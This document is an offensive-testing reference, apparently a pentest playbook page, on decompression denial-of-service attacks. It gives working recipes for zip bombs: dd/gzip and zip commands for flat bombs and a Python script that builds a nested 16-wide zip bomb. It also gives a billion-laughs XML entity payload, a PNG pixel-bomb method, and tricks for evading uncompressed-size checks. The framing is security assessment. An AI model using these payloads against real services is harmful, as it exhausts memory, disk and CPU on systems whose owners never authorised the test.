# Zip Bombs Deep — decompression DoS shapes

## The ratio game — the bomb is in the expansion

```
100MB of zeros → deflate → ~100KB
nested zips (42.zip) → exponential: each layer contains K copies of next
xml entity bombs → text-level exponential inside xml parts
```

## Flat bombs — the ratio attack

```bash
dd if=/dev/zero bs=1M count=1000 | gzip -9 > flat.gz    # ~1MB → 1GB
# or zip:
truncate -s 1G zeros && zip -9 flat.zip zeros
```

The 10:1 to 1000:1 deflate ratio is the lever — a 100KB upload unpacks to
100MB; the consumer's memory/disk/CPU bound is the limit.

## Nested bombs — 42.zip structure

```
layer0.zip contains K zips each containing K copies of layer1.zip ...
```

K=16, depth=4: 16⁴ = 65,536 inner files each unpacking to GBs — total
PBs. Real CTF shows the shape; you rarely need depth>3.

Building it: each layer is a zip containing K copies of the next — the
innermost carries the real bomb file. `archive_gen` doesn't emit nested —
hand-craft:

```python
import zipfile, io
inner = io.BytesIO()
with zipfile.ZipFile(inner,'w',zipfile.ZIP_DEFLATED) as z:
    z.writestr('bomb', b'0'*10**8)          # 100MB of zeros
data = inner.getvalue()
for depth in range(3):
    outer = io.BytesIO()
    with zipfile.ZipFile(outer,'w',zipfile.ZIP_DEFLATED) as z:
        for i in range(16):
            z.writestr(f'l{depth}_{i}.zip', data)
    data = outer.getvalue()
open('bomb.zip','wb').write(data)
```

## XML bombs inside document parts

docx/xlsx/svg XML parts carry entity-expansion bombs:

```xml
<!DOCTYPE r [
  <!ENTITY a "AAAAAAAAAA">
  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
  <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
]>
<r>&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;</r>
```

a(10)×b(10)×c(10)×d(10) refs → 10⁶+ chars expansion per reference; parsers
that resolve entities eat the expansion in memory. `libxml` caps at ~10x
amplification/64MB by default — older parsers don't.

## The "decompress in memory" trap — which target it hits

| Target | Bomb shape that kills it |
|---|---|
| `ZipFile.read(name)` into a Python str | memory — flat bomb suffices |
| `extractall` to disk | disk — flat bomb suffices |
| nested `zf.open` on embedded zips | recursive — nested bomb |
| image decode (`PIL`, sharp) | pixel bombs — decompression bomb is different: a small compressed png decoding to a 10⁸-pixel image — decompression bomb specifically |
| xml parse | entity bomb |
| text import of `colossal.txt` | single-file size |

## PNG decompression bombs — the pixel variant

PNG IDAT deflate — a 30KB png decoding to 100MP pixels (e.g., 40000×40000)
— the "decompression bomb" that hits `PIL.Image.open` (which sets
`MAX_IMAGE_PIXELS` warnings, not always a hard cap). Crafted via a
giant-dimensions IHDR + highly compressible scanlines.

## The "does the check cap total uncompressed size" test

- zip headers report `usize` per entry — a validator summing them may
  catch the flat bomb — but `flags bit3` data-descriptor puts sizes AFTER
  data — the header says `usize=0`
- nested bombs evade per-entry usize checks (each entry is small)
- real defense is a decompression-stream cap, rarely present

## `zipslip` vs `zipbomb` — different goals

The bomb needs the decompress step; the slip needs the extract-to-disk
step. Both need an extractor — the sink discovery is the same.

## Falsifiers

- the app never decompresses/extracts
- the extractor caps output size/ratio strictly (real cap on stream, not
  header sums)

## Output to record

- the consumer's cap measured (or "none") + the bomb's expansion ratio
